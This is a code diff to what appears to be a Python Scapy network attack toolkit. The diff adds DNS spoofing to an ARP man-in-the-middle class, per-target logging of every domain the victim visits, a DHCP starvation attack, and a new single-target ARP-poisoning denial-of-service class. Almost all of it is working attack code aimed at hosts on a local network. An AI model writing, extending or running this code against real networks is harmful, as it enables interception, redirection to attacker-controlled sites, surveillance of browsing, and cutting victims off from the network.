@@ -2,14 +2,16 @@ import threading
 import time
 import random
 from scapy.all import *
+from scapy.layers.dns import DNSQR, DNS, DNSRR
 from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import ARP, Ether
 from scapy.layers.dhcp import BOOTP, DHCP
 from scapy.utils import mac2str
-
+from utils import get_mac_by_ip, get_gateway
+import os
 
 class ArpPoisoning:
-    def __init__(self, target, gateway, iface, do_save):
+    def __init__(self, target, gateway, iface, do_save, spoofed_ip=None, original_domain=None):
         self.target = target
         self.gateway = gateway
         self.attacker_mac = get_if_hwaddr(iface)
@@ -19,17 +21,24 @@ class ArpPoisoning:
         self.__sniff_thread = None
         self.do_save = do_save
         self.pcap_writer = None
+        self.original_domain = original_domain
+        self.spoofed_ip = spoofed_ip
+        self.visited_domains = set()  # track visited domains
         
+        # Centralized path management
+        self.hosts_dir = "hosts"
+        self.current_host_dir = os.path.join(self.hosts_dir, self.target.ip_address)
+        self.captures_dir = os.path.join(self.current_host_dir, "captures")
+        self.visited_domains_file = os.path.join(self.current_host_dir, "visited_domains.txt")
+
         if self.do_save:
             try:
-                import os
-                captures_dir = "captures"
-                if not os.path.exists(captures_dir):
-                    os.makedirs(captures_dir)
+                if not os.path.exists(self.captures_dir):
+                    os.makedirs(self.captures_dir)
                     
-                #set filename based on target and gateway IPs and timestamp
+                #set filename based on timestamp
                 timestamp = time.strftime("%Y%m%d-%H%M%S")
-                self.pcap_filename = os.path.join(captures_dir, f"arp_poison_{self.target.ip_address}_{self.gateway.ip_address}_{timestamp}.pcap")
+                self.pcap_filename = os.path.join(self.captures_dir, f"arp_poison_{timestamp}.pcap")
                 self.pcap_writer = PcapWriter(self.pcap_filename, append=True, sync=True)
             except Exception as e:
                 print(f"Error initializing packet capture: {e}")
@@ -42,6 +51,7 @@ class ArpPoisoning:
         putting the attacker's machine in the middle of their communication
         :return:
         """
+
         arp_to_gateway = Ether(
             dst=self.gateway.mac_address,
             src=self.attacker_mac) / ARP(
@@ -63,6 +73,31 @@ class ArpPoisoning:
         sendp(arp_to_gateway, iface=self.iface, verbose=False)
         sendp(arp_to_target, iface=self.iface, verbose=False)
 
+    def check_new_domain(self, qname):
+        if qname not in self.visited_domains:
+            self.visited_domains.add(qname)
+            #save visited domain to file
+            try:
+                with open(self.visited_domains_file, "a") as f:
+                    f.write(qname + "\n")
+            except Exception as e:
+                print(f"Error saving visited domain: {e}")
+
+    def is_dns(self, pkt):
+        return pkt.haslayer(DNS) and pkt.haslayer(DNSQR)
+    def send_spoofed_dns(self, pkt):
+        qname = pkt[DNSQR].qname.decode()
+        if not self.original_domain in qname:
+            return False
+        # Craft a DNS response with the spoofed IP
+        dns_response = Ether(src=self.attacker_mac, dst=self.target.mac_address) \
+                       / IP(src=pkt[IP].dst, dst=pkt[IP].src) \
+                       / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) \
+                       / DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                             an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=self.spoofed_ip))
+        sendp(dns_response, iface=self.iface, verbose=False)
+        return True
+
     def forward_packet(self, pkt):
         """
         forwards packets between the target and the gateway, modifying the
@@ -76,6 +111,13 @@ class ArpPoisoning:
 
         # traffic from target to gatewat
         if pkt[Ether].src == self.target.mac_address:
+            if self.is_dns(pkt):
+                if self.spoofed_ip and self.send_spoofed_dns(pkt):
+                    return
+                qname = pkt[DNSQR].qname.decode()
+                #remove scapy's trailing dot from the domain name
+                qname = qname[:-1] if qname.endswith(".") else qname
+                self.check_new_domain(qname)
             pkt[Ether].src = self.attacker_mac
             pkt[Ether].dst = self.gateway.mac_address
             #save packet to pcap if enabled
@@ -145,7 +187,22 @@ class ArpPoisoning:
 
     def start(self):
         self.is_running = True
-
+        try:
+            if not os.path.exists(self.hosts_dir):
+                os.makedirs(self.hosts_dir)
+            if not os.path.exists(self.current_host_dir):
+                os.makedirs(self.current_host_dir)
+                
+            #load visited domains for this host if exists
+            if os.path.exists(self.visited_domains_file):
+                with open(self.visited_domains_file, "r") as f:
+                    self.visited_domains = set(line.strip() for line in f)
+            else:
+                #create empty file to track visited domains
+                with open(self.visited_domains_file, "w") as f:
+                    pass
+        except Exception as e:
+            print(f"Error creating/opening directories for packet capture: {e}")
         # poisoning thread
         self.__thread = threading.Thread(target=self.poison)
         self.__thread.start()
@@ -176,13 +233,13 @@ class ArpPoisoning:
         print("ARP poisoning stopped, ARP tables restored.")
 
 
-class DoS:
+class DHCPStarvation:
     def __init__(self, *, iface):
         self.__thread = None
         self.iface = iface
         self.is_running = False
 
-    def Dos_attack(self):
+    def dhcp_starve_attack(self):
         # packet template with static fields
         dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") \
                         / IP(src="0.0.0.0", dst="255.255.255.255") \
@@ -202,7 +259,7 @@ class DoS:
     def start(self):
         self.is_running = True
         conf.checkIPaddr = False
-        self.__thread = threading.Thread(target=self.Dos_attack)
+        self.__thread = threading.Thread(target=self.dhcp_starve_attack)
         self.__thread.start()
 
     def stop(self):
@@ -210,3 +267,59 @@ class DoS:
         conf.checkIPaddr = True
         if self.__thread is not None:
             self.__thread.join()
+
+class SingleTargetDos:
+    def __init__(self, target, gateway_ip, gateway_mac, iface):
+        self.target_ip = target.ip_address
+        self.target_mac = target.mac_address
+        self.attacker_mac = get_if_hwaddr(iface)
+        self.gateway_ip = gateway_ip
+        self.gateway_mac = gateway_mac
+        self.iface = iface
+        self.is_running = False
+        self.__thread = None
+
+    def send_poison_packet(self):
+        """Sends a single spoofed ARP packet to the target."""
+        arp_to_target = Ether(
+            dst=self.target_mac,
+            src=self.attacker_mac) / ARP(
+            op=2,  # is-at
+            pdst=self.target_ip,
+            hwdst=self.target_mac,
+            psrc=self.gateway_ip,
+            hwsrc=self.attacker_mac
+        )
+        sendp(arp_to_target, iface=self.iface, verbose=False)
+
+    def restore_tables(self):
+        """Restores the target's ARP table to the correct gateway mapping."""
+        arp_to_target = Ether(
+            dst=self.target_mac,
+            src=self.attacker_mac
+        ) / ARP(
+            op=2,  # is-at
+            pdst=self.target_ip,
+            hwdst=self.target_mac,
+            psrc=self.gateway_ip,
+            hwsrc=self.gateway_mac
+        )
+        sendp(arp_to_target, iface=self.iface, verbose=False)
+
+    def poison_loop(self):
+        """Main loop that continuously sends poison packets."""
+        while self.is_running:
+            self.send_poison_packet()
+            time.sleep(0.5) # Fast interval to ensure the cache stays poisoned
+
+    def start(self):
+        self.is_running = True
+        self.__thread = threading.Thread(target=self.poison_loop)
+        self.__thread.start()
+
+    def stop(self):
+        self.is_running = False
+        if self.__thread is not None:
+            self.__thread.join()
+        self.restore_tables()
+
